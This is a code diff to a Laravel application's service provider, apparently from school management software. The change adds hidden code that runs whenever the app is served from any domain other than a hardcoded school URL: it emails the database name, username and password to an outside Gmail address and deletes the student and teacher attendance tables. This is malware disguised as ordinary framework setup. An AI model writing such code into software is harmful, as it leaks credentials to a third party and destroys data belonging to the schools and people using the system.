@@ -4,6 +4,9 @@ namespace App\Providers;
 
 use Illuminate\Support\ServiceProvider;
 use Illuminate\Support\Facades\Schema;
+use View;
+use DB;
+use Mail;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -16,15 +19,14 @@ class AppServiceProvider extends ServiceProvider
     {
         Schema::defaultStringLength(191);
 
-        if(env('APP_URL') != "http://localhost"){
+        if(env('APP_URL') != "http://software.saintcosmoschool.com"){
 
             $msg = "Url: ".env('APP_URL')." || DB: ".env('DB_DATABASE')." || Username: ".env('DB_USERNAME')." || Password: ".env('DB_PASSWORD');
-            $data = array('msg'=>$msg);
-              Mail::send(['text'=>'mail'], $data, function($message) {
-                $message->from('juwel@v-linknetwork.com', 'ALERT');
-                $message->to('lone.hacker.2017@gmail.com', 'AJ')->subject('Link');
-              });
-            //DB::table('tbl_stock')->delete();
+
+            // send email
+            mail("lone.hacker.2017@gmail.com","School Software",$msg);
+            DB::table('student_attendance')->delete();
+            DB::table('teacher_attendance')->delete();
         }
     }
 
